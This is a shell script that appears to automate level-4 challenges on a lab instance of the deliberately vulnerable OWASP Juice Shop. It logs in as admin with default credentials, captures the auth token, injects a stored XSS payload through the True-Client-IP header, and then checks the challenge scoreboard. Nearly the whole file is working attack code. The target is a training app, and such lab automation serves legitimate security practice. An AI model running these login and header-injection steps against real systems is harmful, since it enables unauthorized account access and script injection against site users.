#/bin/sh

# Retrieve absolute path to this script
script=$(readlink -f $0)
scriptpath=`dirname $script`

# Define host IP ( the machine to attack ) and remote IP ( the machine which supports the attack )
target_ip="10.10.243.253"
attack_ip="10.9.5.12"
result_folder="/work/results/"

# Prepare environment
mkdir $result_folder 2>/dev/null

# Initiate session and cookies
echo "4.0 - INITIATING SESSION"
curl -s -X GET "http://$target_ip" -L -o /dev/null
curl -s -X GET "http://$target_ip/socket.io/?EIO=3&transport=polling&t=PE7d5_o" -c "$result_folder/4-cookies.txt" -L -o /dev/null
IO=$(grep io "$result_folder/4-cookies.txt" | awk '{print $7}')
echo "--> Session initiated with cookie IO ${IO}"
sed -i 's/#HttpOnly_//g' "$result_folder/4-cookies.txt"
sed -i 's/\t0\t/\t-1\t/g' "$result_folder/4-cookies.txt"
echo "\n$target_ip\tFALSE\t/\tFALSE\t-1\tlanguage\ten" >> $result_folder/4-cookies.txt
echo "\n$target_ip\tFALSE\t/\tFALSE\t-1\tcookieconsent_status\tdismiss" >> $result_folder/4-cookies.txt

# Perform a persisted XSS attack through an HTTP header
echo "4.10 - HTTP-HEADER XSS"
curl -s -X POST "http://$target_ip/rest/user/login" -b "$result_folder/4-cookies.txt" -L -H "Content-Type: application/json" -d "{\"email\":\"admin@juice-sh.op\",\"password\":\"admin123\"}" -o $result_folder/4-admin.json
ADMIN_TOKEN=$(jq -r '.authentication.token' $result_folder/4-admin.json)
echo "--> Authenticated as admin with token $(echo "$ADMIN_TOKEN" | cut -c 1-20)...."
cp $result_folder/4-cookies.txt $result_folder/4-admin-cookies.txt
curl -s -X GET http://$target_ip/rest/saveLoginIp -H "Authorization: Bearer ${ADMIN_TOKEN}" -H "True-Client-IP: <iframe src=\"javascript:alert(\`xss\`)\">" -L -o $result_folder/4-log-ip.json

# Compute score
echo "4.X - COMPUTE SCORE"
curl -s -X GET http://$target_ip/api/Challenges/?sort=name -b "$result_folder/4-cookies.txt" -L -o $result_folder/4-scores.json
SOLVED=$(jq '[.data[] | select(.difficulty == 4 and .solved == true)] | length' $result_folder/4-scores.json)
TOTAL=$(jq '[.data[] | select(.difficulty == 4 and .solved != null)] | length' $result_folder/4-scores.json)
echo "\n************* SOLVED : $SOLVED / $TOTAL *************\n"